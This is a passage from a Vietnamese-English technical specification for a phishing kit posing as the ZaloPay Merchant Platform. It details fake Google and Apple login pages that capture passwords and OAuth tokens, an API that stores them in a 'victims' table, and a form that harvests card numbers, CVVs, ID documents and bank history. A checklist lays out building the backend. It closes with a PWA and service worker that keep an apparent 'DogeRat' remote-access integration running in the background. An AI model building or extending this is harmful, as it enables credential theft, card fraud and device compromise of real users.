  "victim_id": "uuid-here",
  "redirect_url": "/merchant/auth_success.html?email=...&name=..."
}
```

**Database Operations:**
1. Insert vào `victims` table với thông tin cơ bản
2. Insert vào `oauth_tokens` table với encrypted tokens
3. Update `victims.validation` với OAuth validation results

### 6.2. Session Management

**Strategy:**
- Sử dụng sessionStorage để lưu OAuth data tạm thời
- Backend tạo session với victim_id sau khi capture OAuth
- Session cookie được set để maintain state giữa các trang

**Implementation:**
```javascript
// Store OAuth data in sessionStorage
sessionStorage.setItem('oauth_data', JSON.stringify({
    email: 'user@example.com',
    name: 'Nguyễn Văn A',
    provider: 'google',
    victim_id: 'uuid-here'
}));

// Retrieve in register.html
const oauthData = JSON.parse(sessionStorage.getItem('oauth_data') || '{}');
if (oauthData.email) {
    document.getElementById('business_email').value = oauthData.email;
    document.getElementById('representative_email').value = oauthData.email;
    document.getElementById('representative_name').value = oauthData.name;
}
```

### 6.3. Data Pre-filling Strategy

**Sources:**
1. **From OAuth Profile:**
   - Email → `business_email`, `representative_email`
   - Name → `representative_name`
   - Picture → Có thể hiển thị avatar (optional)

2. **From URL Parameters:**
   - `?oauth=success&email=xxx&name=xxx`
   - Parse và pre-fill vào form

3. **From Session Storage:**
   - Lưu OAuth data sau khi login thành công
   - Retrieve khi load register.html

**Implementation:**
```javascript
// Pre-fill logic in register.html
function prefillFromOAuth() {
    // Check URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const oauthSuccess = urlParams.get('oauth') === 'success';
    
    if (oauthSuccess) {
        const email = urlParams.get('email');
        const name = urlParams.get('name');
        
        if (email) {
            document.getElementById('business_email').value = email;
            document.getElementById('representative_email').value = email;
        }
        
        if (name) {
            document.getElementById('representative_name').value = name;
        }
    }
    
    // Check sessionStorage
    const oauthData = JSON.parse(sessionStorage.getItem('oauth_data') || '{}');
    if (oauthData.email && !email) {
        document.getElementById('business_email').value = oauthData.email;
        document.getElementById('representative_email').value = oauthData.email;
    }
    
    if (oauthData.name && !name) {
        document.getElementById('representative_name').value = oauthData.name;
    }
}

// Call on page load
window.addEventListener('DOMContentLoaded', prefillFromOAuth);
```

### 6.4. Error Handling và Fallback Flows

**Error Scenarios:**

1. **OAuth Login Fails**
   - Redirect đến `auth_error.html`
   - Hiển thị error message
   - Provide "Try again" button
   - Provide "Use phone/OTP instead" option

2. **OAuth Token Capture Fails**
   - Log error to backend
   - Still allow user to continue (graceful degradation)
   - Show warning message

3. **Form Validation Fails**
   - Highlight invalid fields
   - Show specific error messages
   - Scroll to first error field
   - Prevent form submission

4. **Network Errors**
   - Show retry button
   - Auto-retry với exponential backoff
   - Save form data locally để không mất dữ liệu

**Error Page Structure:**
```html
<!-- auth_error.html -->
<div class="error-container">
    <div class="error-icon">⚠️</div>
    <h2>Đăng nhập không thành công</h2>
    <p>Đã xảy ra lỗi khi đăng nhập bằng Google. Vui lòng thử lại.</p>
    <div class="error-actions">
        <a href="google_auth.html" class="btn btn-primary">Thử lại</a>
        <a href="auth_signup_preview.html" class="btn btn-outline-secondary">Chọn phương thức khác</a>
    </div>
</div>
```

## 7. Liệt Kê File HTML Cần Tạo/Cập Nhật

### 7.1. Files Cần Tạo Mới

1. **`static/merchant/google_auth.html`**
   - Trang đăng nhập Google với giao diện giống Google Accounts
   - Capture OAuth credentials
   - Redirect đến auth_success.html sau khi thành công

2. **`static/merchant/apple_auth.html`**
   - Trang đăng nhập Apple ID
   - Tương tự Google nhưng theo Apple design
   - Redirect đến auth_success.html sau khi thành công

3. **`static/merchant/auth_success.html`**
   - Trang hiển thị thông báo đăng nhập thành công
   - Auto-redirect sau 3 giây đến register.html
   - Manual "Continue" button

4. **`static/merchant/auth_error.html`** (Optional nhưng recommended)
   - Trang xử lý lỗi OAuth
   - Provide retry và fallback options

### 7.2. Files Cần Cập Nhật

1. **`static/merchant/auth_signup_preview.html`**
   - **Line 228:** Update link từ `google_auth.html` (placeholder) thành actual link
   - **Line 233:** Update link từ `apple_auth.html` (placeholder) thành actual link
   - **Add:** OAuth interception JavaScript logic

2. **`static/merchant/auth_signup.html`**
   - Tương tự auth_signup_preview.html
   - Update social login button links

3. **`static/merchant/register.html`**
   - **Add:** Pre-fill logic từ OAuth data (JavaScript)
   - **Add:** Dynamic form fields dựa trên business_type
   - **Add:** Real-time validation feedback
   - **Add:** Auto-save to localStorage
   - **Add:** Progress indicator (optional)
   - **Add:** Better error handling

## 8. Recommendations và Best Practices

### 8.1. Security Considerations

1. **OAuth Token Storage**
   - Encrypt tokens trước khi lưu vào database
   - Sử dụng AES-256-GCM encryption
   - Never expose tokens trong frontend code

2. **Session Security**
   - Use secure, httpOnly cookies
   - Implement CSRF protection
   - Session timeout after inactivity

3. **Input Validation**
   - Validate cả client-side và server-side
   - Sanitize user inputs
   - Prevent XSS attacks

### 8.2. Performance Optimization

1. **Lazy Loading**
   - Load OAuth pages chỉ khi user click
   - Defer non-critical JavaScript

2. **Caching**
   - Cache static assets
   - Cache bank list API response

3. **Form Optimization**
   - Debounce validation calls
   - Batch API requests khi có thể

### 8.3. User Experience

1. **Loading States**
   - Show spinners khi đang xử lý
   - Disable buttons khi submit
   - Provide progress feedback

2. **Error Messages**
   - Clear, actionable error messages
   - Highlight problematic fields
   - Provide suggestions để fix errors

3. **Success Feedback**
   - Clear success messages
   - Confirmation before redirect
   - Smooth transitions

## 9. Testing Checklist

### 9.1. Functional Testing

- [ ] Test Google OAuth flow end-to-end
- [ ] Test Apple OAuth flow end-to-end
- [ ] Test Phone/OTP flow
- [ ] Test form pre-filling từ OAuth
- [ ] Test form validation (tất cả scenarios)
- [ ] Test file upload functionality
- [ ] Test form submission và error handling

### 9.2. UI/UX Testing

- [ ] Test responsive design trên mobile/tablet/desktop
- [ ] Test accessibility (keyboard navigation, screen readers)
- [ ] Test loading states và transitions
- [ ] Test error message display
- [ ] Test auto-redirect timing

### 9.3. Integration Testing

- [ ] Test OAuth token capture và storage
- [ ] Test database operations
- [ ] Test session management
- [ ] Test API integrations

## 10. Actual Form Field Mapping (From Code)

### Complete Form Field Reference

**File:** `static/merchant/register.html`

#### Section 1: Business Type
| Field ID | Field Name | Type | Required | Default | Notes |
|----------|------------|------|---------|---------|-------|
| `individual` | `business_type` | radio | Yes | checked | Value: "individual" |
| `enterprise` | `business_type` | radio | Yes | - | Value: "enterprise" |

#### Section 2: Business Information
| Field ID | Field Name | Type | Required | Max Length | Validation |
|----------|------------|------|---------|------------|-----------|
| `business_name` | `business_name` | text | Yes | - | - |
| `industry` | `industry` | select | Yes | - | Options: restaurant, retail, services, entertainment, online, canteen, parking, other |
| `tax_code` | `tax_code` | text | No | - | Format: 10 or 13 digits (only shown for enterprise) |
| `business_license` | `business_license` | text | No | - | (only shown for enterprise) |
| `business_address` | `business_address` | textarea | Yes | 500 | Character counter |
| `business_phone` | `business_phone` | tel | Yes | - | Format: `^(0|\+84)[0-9]{9,10}$` |
| `business_email` | `business_email` | email | Yes | - | Email format validation |
| `website` | `website` | url | No | - | Must start with http:// or https:// |

#### Section 3: Representative Information
| Field ID | Field Name | Type | Required | Validation |
|----------|------------|------|---------|-----------|
| `representative_name` | `representative_name` | text | Yes | - |
| `representative_phone` | `representative_phone` | tel | Yes | Format: `^(0|\+84)[0-9]{9,10}$` |
| `representative_email` | `representative_email` | email | Yes | Email format validation |
| `representative_id_number` | `representative_id_number` | text | Yes | Format: `^[0-9]{9}$|^[0-9]{12}$` (CMND/CCCD) |
| `representative_position` | `representative_position` | text | No | - |

#### Section 4: Bank Account Information
| Field ID | Field Name | Type | Required | Notes |
|----------|------------|------|---------|-------|
| `bank_name` | `bank_name` | select | Yes | Loaded from `/api/banks` |
| `bank_account_number` | `bank_account_number` | text | Yes | Numbers only, 8-20 digits |
| `bank_account_name` | `bank_account_name` | text | Yes | - |
| `bank_branch` | `bank_branch` | text | No | - |

#### Section 4 (Subsection): Card Information (Optional)
| Field ID | Field Name | Type | Required | Validation |
|----------|------------|------|---------|-----------|
| `card_visa` | `card_type` | radio | No | Value: "visa" |
| `card_mastercard` | `card_type` | radio | No | Value: "mastercard" |
| `card_jcb` | `card_type` | radio | No | Value: "jcb" |
| `card_number` | `card_number` | text | No | Max: 19 chars, Luhn algorithm, Auto-format with spaces |
| `card_holder_name` | `card_holder_name` | text | No | Max: 100 chars |
| `card_expiry` | `card_expiry` | text | No | Format: MM/YY, Max: 5 chars, Auto-format with "/" |
| `card_cvv` | `card_cvv` | text | No | Format: 3-4 digits, Max: 4 chars |

#### Section 5: Documents
| Field ID | Field Name | Type | Required | Accept | Max Size |
|----------|------------|------|---------|--------|----------|
| `business_license_file` | `business_license_file` | file | No | .pdf,.jpg,.jpeg,.png | 16MB |
| `representative_id_file` | `representative_id_file` | file | No | .pdf,.jpg,.jpeg,.png | 16MB |
| `business_location_photos` | `business_location_photos` | file (multiple) | No | .jpg,.jpeg,.png | 16MB each |

#### Section 6: Terms
| Field ID | Field Name | Type | Required | Notes |
|----------|------------|------|---------|-------|
| `accept_terms` | - | checkbox | Yes | Must be checked to submit |

#### Section 7: Identity Verification
| Field ID | Field Name | Type | Required | Accept | Max Size |
|----------|------------|------|---------|--------|----------|
| `card_image` | `card_image` | file | Yes | .jpg,.jpeg,.png | 16MB |
| `transaction_history` | `transaction_history` | file (multiple) | Yes | .jpg,.jpeg,.png,.pdf | 16MB each |

### Actual Validation Rules (From JavaScript Code)

**Email Validation**:
```javascript
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
```

**Phone Validation (Vietnamese)**:
```javascript
const phoneRegex = /^(0|\+84)[0-9]{9,10}$/;
```

**CMND/CCCD Validation**:
```javascript
const idRegex = /^[0-9]{9}$|^[0-9]{12}$/;
```

**Tax Code Validation**:
```javascript
const taxRegex = /^[0-9]{10}$|^[0-9]{13}$/;
```

**Card Number Validation (Luhn Algorithm)**:
```javascript
function validateCardNumber(cardNumber) {
    const cleaned = cardNumber.replace(/[\s-]/g, '');
    if (!/^\d+$/.test(cleaned)) return false;
    if (cleaned.length < 13 || cleaned.length > 19) return false;
    
    // Luhn algorithm implementation
    let sum = 0;
    let isEven = false;
    for (let i = cleaned.length - 1; i >= 0; i--) {
        let digit = parseInt(cleaned[i]);
        if (isEven) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
    }
    return sum % 10 === 0;
}
```

**Card Expiry Date Validation**:
```javascript
function validateExpiryDate(expiry) {
    const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
    if (!expiryRegex.test(expiry)) return false;
    
    const [month, year] = expiry.split('/');
    const expiryMonth = parseInt(month);
    const expiryYear = 2000 + parseInt(year);
    
    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth() + 1;
    
    if (expiryYear < currentYear) return false;
    if (expiryYear === currentYear && expiryMonth < currentMonth) return false;
    
    return true;
}
```

**CVV Validation**:
```javascript
const cvvRegex = /^[0-9]{3,4}$/;
```

## 11. API Endpoint Specifications

### 11.1. POST /api/capture/oauth

**Purpose**: Capture OAuth tokens và create victim record

**Request Headers**:
```
Content-Type: application/json
```

**Request Body**:
```json
{
  "provider": "google" | "apple",
  "email": "user@example.com",
  "password": "captured_password",  // For simulation only
  "tokens": {
    "access_token": "ya29.abc123...",
    "refresh_token": "1//def456...",
    "id_token": "eyJhbGciOiJSUzI1NiIs...",
    "expires_in": 3600,
    "scope": "openid email profile",
    "token_type": "Bearer"
  },
  "profile": {
    "email": "user@example.com",
    "name": "Nguyễn Văn A",
    "picture": "https://...",
    "verified_email": true,
    "google_id": "1234567890"  // For Google only
  },
  "session_data": {
    "ip_address": "192.168.1.100",
    "user_agent": "Mozilla/5.0...",
    "device_fingerprint": {
      "screen_resolution": "1920x1080",
      "timezone": "Asia/Ho_Chi_Minh",
      "language": "vi-VN",
      "platform": "Win32"
    }
  }
}
```

**Success Response** (200 OK):
```json
{
  "success": true,
  "victim_id": "550e8400-e29b-41d4-a716-446655440000",
  "redirect_url": "/merchant/auth_success.html?provider=google&email=user@example.com&name=Nguyễn Văn A"
}
```

**Error Response** (400 Bad Request):
```json
{
  "success": false,
  "error": "Invalid OAuth data",
  "error_code": "INVALID_OAUTH_DATA"
}
```

**Error Response** (500 Internal Server Error):
```json
{
  "success": false,
  "error": "Database error",
  "error_code": "DATABASE_ERROR"
}
```

**Database Operations**:
1. Insert into `victims` table với:
   - `email` from profile.email
   - `name` from profile.name
   - `capture_method` = "oauth_google" or "oauth_apple"
   - `session_data` = request.session_data (as JSONB)
   - `device_fingerprint` = request.session_data.device_fingerprint (as JSONB)
   - `validation` = {"status": "pending_validation"} (as JSONB)

2. Insert into `oauth_tokens` table với:
   - `victim_id` = newly created victim ID
   - `provider` = request.provider
   - `token_data` = encrypted tokens (as JSONB)
   - `user_profile` = request.profile (as JSONB)
   - `expires_at` = NOW() + INTERVAL '1 hour'

### 11.2. POST /api/merchant/register

**Purpose**: Process registration form submission

**Request Headers**:
```
Content-Type: multipart/form-data
```

**Request Body** (FormData):
```
business_type: "individual" | "enterprise"
business_name: string
industry: string
tax_code: string (optional, for enterprise)
business_license: string (optional, for enterprise)
business_address: string (max 500 chars)
business_phone: string
business_email: string
website: string (optional)
representative_name: string
representative_phone: string
representative_email: string
representative_id_number: string
representative_position: string (optional)
bank_name: string
bank_account_number: string
bank_account_name: string
bank_branch: string (optional)
card_type: "visa" | "mastercard" | "jcb" (optional)
card_number: string (optional, encrypted)
card_holder_name: string (optional, encrypted)
card_expiry: string (optional, encrypted, format: MM/YY)
card_cvv: string (optional, encrypted)
business_license_file: File (optional)
representative_id_file: File (optional)
business_location_photos: File[] (optional, multiple)
card_image: File (required)
transaction_history: File[] (required, multiple)
accept_terms: "on" (required)
```

**Success Response** (200 OK):
```json
{
  "success": true,
  "message": "Đăng ký thành công! Chúng tôi sẽ liên hệ với bạn sớm nhất.",
  "victim_id": "550e8400-e29b-41d4-a716-446655440000"
}
```

**Error Response** (400 Bad Request):
```json
{
  "success": false,
  "error": "Validation failed",
  "errors": {
    "business_email": "Email không hợp lệ",
    "card_image": "File không được để trống"
  }
}
```

**Database Operations**:
1. If `victim_id` exists (from OAuth), update existing record
2. Otherwise, create new victim record
3. Encrypt card information (if provided) và store in `card_information` JSONB
4. Save identity verification files và store paths in `identity_verification` JSONB
5. Save document files và store paths
6. Update `victims.updated_at` timestamp

### 11.3. GET /api/banks

**Purpose**: Get list of Vietnamese banks

**Request Headers**: None required

**Success Response** (200 OK):
```json
[
  "Vietcombank",
  "BIDV",
  "VietinBank",
  "Agribank",
  "Techcombank",
  "ACB",
  "VPBank",
  "MBBank",
  "TPBank",
  "HDBank",
  "SHB",
  "VIB",
  "Eximbank",
  "MSB",
  "Sacombank",
  "DongA Bank",
  "OCB",
  "SeABank",
  "PGBank",
  "Nam A Bank"
]
```

**Error Response** (500 Internal Server Error):
```json
{
  "error": "Failed to load banks list"
}
```

## 12. Error Handling Specifications

### 12.1. OAuth Capture Errors

**Error Types**:
- `INVALID_CREDENTIALS`: OAuth login failed
- `NETWORK_ERROR`: Connection issues
- `OAUTH_FAILED`: OAuth token exchange failed
- `DATABASE_ERROR`: Database operation failed

**Error Flow**:
1. Frontend catches error from `/api/capture/oauth`
2. Redirects to `auth_error.html?type={error_type}&provider={provider}&code={error_code}`
3. Error page displays appropriate message và retry option

**Error Page** (`auth_error.html`):
- Displays error message based on `type` parameter
- Provides "Try again" button (redirects back to OAuth page)
- Provides "Use phone/OTP instead" option (redirects to auth_signup_preview.html)

### 12.2. Form Submission Errors

**Error Types**:
- `VALIDATION_ERROR`: Form validation failed
- `FILE_TOO_LARGE`: File exceeds 16MB limit
- `INVALID_FILE_TYPE`: File type not allowed
- `DATABASE_ERROR`: Database operation failed
- `ENCRYPTION_ERROR`: Encryption failed

**Error Handling**:
1. Frontend validates before submission
2. If validation fails, shows inline error messages
3. Backend returns detailed error object với field-specific errors
4. Frontend displays errors next to relevant fields

**Error Response Format**:
```json
{
  "success": false,
  "error": "Validation failed",
  "errors": {
    "field_id": "Error message in Vietnamese"
  }
}
```

## 13. File Upload Specifications

### 13.1. File Size Limits

- **Maximum file size**: 16MB per file
- **Card image**: 16MB max
- **Transaction history**: 16MB per file (multiple files allowed)
- **Business license**: 16MB max
- **Representative ID**: 16MB max
- **Business location photos**: 16MB per file (multiple files allowed)

### 13.2. Allowed File Types

**Card Image** (`card_image`):
- `.jpg`, `.jpeg`, `.png` only

**Transaction History** (`transaction_history`):
- `.jpg`, `.jpeg`, `.png`, `.pdf`

**Documents**:
- Business license: `.pdf`, `.jpg`, `.jpeg`, `.png`
- Representative ID: `.pdf`, `.jpg`, `.jpeg`, `.png`
- Business location photos: `.jpg`, `.jpeg`, `.png` only

### 13.3. File Upload Flow

1. **Frontend**:
   - User selects file(s)
   - JavaScript validates file type và size
   - Shows preview (for images)
   - On form submit, files included in FormData

2. **Backend** (to be implemented):
   - Validate file type và size
   - Generate secure filename: `{type}_{victim_id}_{timestamp}.{ext}`
   - Save to `/secure/storage/identity/` or `/secure/storage/documents/`
   - Store file path in database JSONB field
   - Return success response

### 13.4. File Storage Paths

**Card Images**:
```
/secure/storage/identity/card_images/card_image_{victim_id}_{YYYYMMDD}_{HHMMSS}.{jpg|png}
```

**Transaction History**:
```
/secure/storage/identity/transaction_history/transaction_history_{victim_id}_{index}_{YYYYMMDD}_{HHMMSS}.{jpg|png|pdf}
```

**Business Documents**:
```
/secure/storage/documents/business_licenses/{victim_id}_{timestamp}.{pdf|jpg|png}
/secure/storage/documents/representative_ids/{victim_id}_{timestamp}.{pdf|jpg|png}
/secure/storage/documents/business_location_photos/{victim_id}_{index}_{timestamp}.{jpg|png}
```

## 14. Session Management

### 14.1. OAuth Data Storage

**Frontend Implementation** (Current):
- OAuth data stored in `sessionStorage` after successful capture
- Key: `oauth_data`
- Value: JSON string với structure:
```json
{
  "email": "user@example.com",
  "name": "Nguyễn Văn A",
  "provider": "google" | "apple",
  "victim_id": "550e8400-e29b-41d4-a716-446655440000"
}
```

**Backend Implementation** (Required):
- Create session after OAuth capture
- Store session ID in cookie
- Link session to `victim_id`
- Validate session on form submission

### 14.2. Pre-fill Logic

**Sources** (in priority order):
1. URL parameters: `?oauth=success&email=xxx&name=xxx`
2. sessionStorage: `oauth_data` key
3. localStorage: `registration_form_data` (auto-saved form data)

**Pre-filled Fields**:
- `business_email` ← OAuth email
- `representative_email` ← OAuth email
- `representative_name` ← OAuth name

**Implementation** (from `register.html`):
```javascript
function prefillFromOAuth() {
    // Check URL parameters first
    const urlParams = new URLSearchParams(window.location.search);
    const oauthSuccess = urlParams.get('oauth') === 'success';
    
    let email = urlParams.get('email') || '';
    let name = urlParams.get('name') || '';
    
    // Check sessionStorage
    const oauthDataStr = sessionStorage.getItem('oauth_data');
    if (oauthDataStr) {
        const oauthData = JSON.parse(oauthDataStr);
        if (!email && oauthData.email) email = oauthData.email;
        if (!name && oauthData.name) name = oauthData.name;
    }
    
    // Pre-fill form fields
    if (email) {
        document.getElementById('business_email').value = email;
        document.getElementById('representative_email').value = email;
    }
    if (name) {
        document.getElementById('representative_name').value = name;
    }
}
```

### 14.3. Auto-save to localStorage

**Implementation** (from `register.html`):
- Form data auto-saved to `localStorage` key: `registration_form_data`
- Saved on every input/change event
- Restored on page load
- Cleared on successful submission

## 15. Implementation Status

### ✅ Fully Implemented (Frontend)

1. **All HTML Pages**: 
   - ✅ `index.html` - Landing page
   - ✅ `auth_signup_preview.html` - Auth selection
   - ✅ `google_auth.html` - Google OAuth capture
   - ✅ `apple_auth.html` - Apple OAuth capture
   - ✅ `auth_success.html` - Success page với auto-redirect
   - ✅ `auth_error.html` - Error handling page
   - ✅ `register.html` - Complete registration form

2. **Form Functionality**:
   - ✅ All 7 sections implemented
   - ✅ Dynamic field visibility (business_type toggle)
   - ✅ Real-time validation
   - ✅ File upload với preview
   - ✅ Card information capture
   - ✅ Identity verification (Step 7)
   - ✅ Progress indicator
   - ✅ Auto-save to localStorage
   - ✅ OAuth pre-fill logic

3. **Validation**:
   - ✅ Client-side validation for all fields
   - ✅ Email, phone, CMND/CCCD, tax code validation
   - ✅ Card number Luhn algorithm
   - ✅ Card expiry date validation
   - ✅ File type và size validation

### ❌ Not Implemented (Backend Required)

1. **API Endpoints**:
   - ❌ `POST /api/capture/oauth` - **MUST IMPLEMENT**
   - ❌ `POST /api/merchant/register` - **MUST IMPLEMENT**
   - ❌ `GET /api/banks` - **MUST IMPLEMENT**

2. **File Upload Handling**:
   - ❌ File upload endpoint
   - ❌ File storage system
   - ❌ File encryption (if required)

3. **Session Management**:
   - ❌ Backend session creation
   - ❌ Session validation
   - ❌ Session cleanup

4. **Data Processing**:
   - ❌ Card data encryption
   - ❌ OAuth token encryption
   - ❌ Database operations

### ⚠️ Partial Implementation

1. **OAuth Flow**: Frontend simulation complete, backend storage missing
2. **Form Submission**: Frontend validation complete, backend processing missing
3. **File Upload**: Frontend UI complete, backend storage missing

## 16. Developer Checklist

### Phase 1: Backend API Implementation

- [ ] Create Express.js application structure
- [ ] Set up database connection pool (Prisma)
- [ ] Implement `POST /api/capture/oauth` endpoint
  - [ ] Validate request data
  - [ ] Encrypt OAuth tokens (AES-256-GCM)
  - [ ] Create victim record in database
  - [ ] Store OAuth tokens in database
  - [ ] Return success response với `victim_id`
- [ ] Implement `POST /api/merchant/register` endpoint
  - [ ] Parse multipart/form-data (using multer)
  - [ ] Validate all form fields
  - [ ] Encrypt card information
  - [ ] Save identity verification files
  - [ ] Update victim record
  - [ ] Return success response
- [ ] Implement `GET /api/banks` endpoint
  - [ ] Return list of Vietnamese banks

### Phase 2: File Upload Implementation

- [ ] Create file storage directory structure
- [ ] Implement file upload handler
- [ ] Validate file type và size
- [ ] Generate secure filenames
- [ ] Save files to secure storage
- [ ] Store file paths in database
- [ ] Implement file encryption (if required)

### Phase 3: Encryption Implementation

- [ ] Set up encryption key management
- [ ] Implement AES-256-GCM encryption for card data
- [ ] Implement encryption for OAuth tokens
- [ ] Test encryption/decryption
- [ ] Document key rotation procedures

### Phase 4: Session Management

- [ ] Implement session creation after OAuth capture
- [ ] Store session ID in secure cookie
- [ ] Link session to victim_id
- [ ] Validate session on form submission
- [ ] Implement session timeout
- [ ] Implement session cleanup

### Phase 5: Error Handling

- [ ] Implement comprehensive error responses
- [ ] Create error logging system
- [ ] Implement user-friendly error messages
- [ ] Test all error scenarios

### Phase 6: Testing

- [ ] Test OAuth capture flow end-to-end
- [ ] Test registration form submission
- [ ] Test file upload functionality
- [ ] Test validation rules
- [ ] Test error handling
- [ ] Test session management
- [ ] Performance testing

## 17. Conclusion

Tài liệu này cung cấp comprehensive overview về UI flow của ZaloPay Merchant Platform, từ trang chủ đến hoàn tất đăng ký. **Tất cả các file HTML đã được tạo và implement đầy đủ** với:

- ✅ Complete OAuth capture flow (Google và Apple)
- ✅ Full registration form với 7 steps
- ✅ Card information capture
- ✅ Identity verification với file upload
- ✅ Real-time validation
- ✅ Auto-save và pre-fill functionality

**Backend Implementation Status**: 
- ❌ API endpoints cần được implement
- ❌ File storage system cần được setup
- ❌ Database operations cần được implement
- ❌ Encryption service cần được implement

**Next Steps for Developers**:
1. ✅ Frontend đã hoàn thiện - không cần thay đổi
2. ❌ Implement backend API endpoints theo specifications trong section 11
3. ❌ Set up file storage system theo section 13
4. ❌ Implement encryption service
5. ❌ Test toàn bộ flow end-to-end

---

## 18. PWA Installation Flow

### 18.1. Overview

Progressive Web App (PWA) installation flow cho phép người dùng cài đặt ứng dụng web như native app trên mobile devices. Sau khi cài đặt, ứng dụng có thể chạy nền và tất cả tính năng DogeRat API vẫn hoạt động bình thường.

### 18.2. Installation Flow Diagram

```
User → Browser → "Add to Home Screen" → PWA Installed
→ Service Worker Registered → Background Sync Enabled
→ DogeRat API Calls Work in Background
```

### 18.3. Installation Steps

**Step 1: Before Install Prompt**
- Browser detects PWA installability
- `beforeinstallprompt` event fired
- Custom install button shown to user

**Step 2: Install Prompt**
- User clicks install button
- Browser shows install prompt
- User accepts or dismisses

**Step 3: Installation**
- Service Worker registered
- Essential assets cached
- Background sync enabled
- PWA installed on home screen

**Step 4: Post Installation**
- Welcome message shown
- Feature guide displayed
- Background features enabled
- DogeRat API integration active

### 18.4. Implementation

**HTML Integration:**
```html
<!-- Web App Manifest -->
<link rel="manifest" href="/manifest.json">

<!-- Theme Color -->
<meta name="theme-color" content="#0066cc">

<!-- Apple Mobile Web App -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="apple-mobile-web-app-title" content="ZaloPay Merchant">
```

**JavaScript Implementation:**
```javascript
// Detect beforeinstallprompt event
let deferredPrompt = null;

window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    deferredPrompt = e;
    showInstallButton();
});

// Handle install button click
async function installPWA() {
    if (deferredPrompt) {
        deferredPrompt.prompt();
        const { outcome } = await deferredPrompt.userChoice;
        
        if (outcome === 'accepted') {
            console.log('PWA installed successfully');
            await onPWAInstalled();
        }
        
        deferredPrompt = null;
    }
}

// Handle PWA installation
async function onPWAInstalled() {
    // Register Service Worker
    if ('serviceWorker' in navigator) {
        await navigator.serviceWorker.register('/sw.js');
    }
    
    // Set up background sync
    await setupBackgroundSync();
    
    // Enable background features
    await enableBackgroundFeatures();
}
```

### 18.5. Web App Manifest

**File: `public/manifest.json`**
```json
{
  "name": "ZaloPay Merchant Platform",
  "short_name": "ZaloPay Merchant",
  "description": "ZaloPay Merchant Platform với DogeRat API Integration",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#0066cc",
  "orientation": "portrait",
  "icons": [
    {
      "src": "/icons/icon-192x192.png",
      "sizes": "192x192",
      "type": "image/png",
      "purpose": "any maskable"
    },
    {
      "src": "/icons/icon-512x512.png",
      "sizes": "512x512",
      "type": "image/png",
      "purpose": "any maskable"
    }
  ],
  "screenshots": [],
  "categories": ["business", "finance"],
  "shortcuts": [
    {
      "name": "Dashboard",
      "short_name": "Dashboard",
      "description": "Open dashboard",
      "url": "/",
      "icons": [{ "src": "/icons/dashboard-icon.png", "sizes": "96x96" }]
    },
    {
      "name": "Devices",
      "short_name": "Devices",
      "description": "View devices",
      "url": "/devices",
      "icons": [{ "src": "/icons/devices-icon.png", "sizes": "96x96" }]
    }
  ]
}
```

### 18.6. Service Worker Registration

**Service Worker Registration:**
```javascript
// Register Service Worker
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js')
        .then((registration) => {
            console.log('Service Worker registered:', registration);
            
            // Handle service worker updates
            registration.addEventListener('updatefound', () => {
                const newWorker = registration.installing;
                if (newWorker) {
                    newWorker.addEventListener('statechange', () => {
                        if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
                            // New service worker available
                            showUpdateNotification();
                        }
                    });
                }
            });
        })
        .catch((error) => {
            console.error('Service Worker registration failed:', error);
        });
}
```

## 19. Background Service Worker Flow

### 19.1. Overview

Background Service Worker flow cho phép ứng dụng web chạy nền trên mobile devices, đảm bảo tất cả tính năng DogeRat API vẫn hoạt động bình thường khi ứng dụng chạy nền hoặc offline.

### 19.2. Background Flow Diagram

```
Service Worker → Background Sync → API Calls → Cache Update
→ Push Notifications → User Notification
→ DogeRat API Calls Work in Background
```

### 19.3. Background Operations

**Device Data Sync:**
- Service Worker syncs device data từ DogeRat API trong background
- Data stored in IndexedDB for offline access
- Cache updated automatically

**Action Execution Sync:**
- Action execution results synced trong background
- Results stored in IndexedDB
- UI updated when app opens

**File Upload Sync:**
- File uploads queued khi offline
- Uploads executed khi online
- Results synced trong background

**Socket.IO Connection:**
- Socket.IO connection maintained trong background
- Events queued khi app closed
- Events processed khi app opens

### 19.4. Service Worker Implementation

**File: `public/sw.js`**
```javascript
// Service Worker for PWA background support
const CACHE_NAME = 'zalopay-merchant-v1';
const API_CACHE_NAME = 'zalopay-api-v1';

// Install event - Cache essential assets
self.addEventListener('install', (event) => {
    event.waitUntil(
        caches.open(CACHE_NAME).then((cache) => {
            return cache.addAll([
                '/',
                '/index.html',
                '/manifest.json',
                '/icons/icon-192x192.png',
                '/icons/icon-512x512.png'
            ]);
        })
    );
});

// Fetch event - Network-first strategy for API, Cache-first for assets
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    
    // API calls - Network-first strategy
    if (url.pathname.startsWith('/api/')) {
        event.respondWith(
            fetch(event.request)
                .then((response) => {
                    // Cache successful responses
                    if (response.ok) {
                        const responseClone = response.clone();
                        caches.open(API_CACHE_NAME).then((cache) => {
                            cache.put(event.request, responseClone);
                        });
                    }
                    return response;
                })
                .catch(() => {
                    // Fallback to cache if network fails
                    return caches.match(event.request);
                })
        );
    } else {
        // Static assets - Cache-first strategy
        event.respondWith(
            caches.match(event.request)
                .then((response) => {
                    return response || fetch(event.request);
                })
        );
    }
});

// Background Sync event - Sync device data
self.addEventListener('sync', (event) => {
    if (event.tag === 'sync-device-data') {
        event.waitUntil(syncDevicesFromAPI());
    }
    
    if (event.tag === 'sync-action-results') {
        event.waitUntil(syncActionResultsFromAPI());
    }
    
    if (event.tag === 'sync-file-uploads') {
        event.waitUntil(syncFileUploadsFromAPI());
    }
});

// Push notification event
self.addEventListener('push', (event) => {
    const data = event.data.json();
    
    const options = {
        body: data.body,
        icon: '/icons/icon-192x192.png',
        badge: '/icons/badge-72x72.png',
        tag: data.tag,
        data: data.data
    };
    
    event.waitUntil(
        self.registration.showNotification(data.title, options)
    );
});

// Notification click event
self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    
    event.waitUntil(
        clients.openWindow(event.notification.data.url || '/')
    );
});

// Helper functions
async function syncDevicesFromAPI() {
    try {
